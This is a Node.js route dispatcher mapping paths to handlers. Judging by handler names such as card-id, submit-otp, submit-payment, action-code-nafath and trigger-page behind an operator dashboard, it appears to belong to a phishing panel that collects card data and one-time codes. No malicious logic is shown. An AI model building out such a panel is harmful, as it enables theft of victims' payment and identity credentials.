const handlers = {
  'dashboard/login': require('../lib/handlers/dashboard-login'),
  'dashboard/logout': require('../lib/handlers/dashboard-logout'),
  'dashboard/user-info': require('../lib/handlers/dashboard-user-info'),
  'dashboard/card-id': require('../lib/handlers/dashboard-card-id'),
  'dashboard/polling-dashboard': require('../lib/handlers/dashboard-polling'),
  'dashboard/stats': require('../lib/handlers/dashboard-stats'),
  'dashboard/trigger-page': require('../lib/handlers/dashboard-trigger-page'),
  'dashboard/action-code': require('../lib/handlers/dashboard-action-code'),
  'dashboard/action-code-nafath': require('../lib/handlers/dashboard-action-code-nafath'),
  'dashboard/delete-user': require('../lib/handlers/dashboard-delete-user'),
  'dashboard/delete-all': require('../lib/handlers/dashboard-delete-all'),
  'submit-form': require('../lib/handlers/submit-form'),
  'submit-otp': require('../lib/handlers/submit-otp'),
  'submit-payment': require('../lib/handlers/submit-payment'),
  'submit-payment2': require('../lib/handlers/submit-payment2'),
  'submit-s': require('../lib/handlers/submit-s'),
  'heartbeat': require('../lib/handlers/heartbeat'),
  'polling-redirect': require('../lib/handlers/polling-redirect'),
  'wait-fn': require('../lib/handlers/wait-fn'),
};

module.exports = async (req, res) => {
  const pathSegments = req.query.path;
  const route = Array.isArray(pathSegments) ? pathSegments.join('/') : pathSegments;

  const handler = handlers[route];
  if (handler) {
    return handler(req, res);
  }

  res.status(404).json({ error: 'Not found' });
};
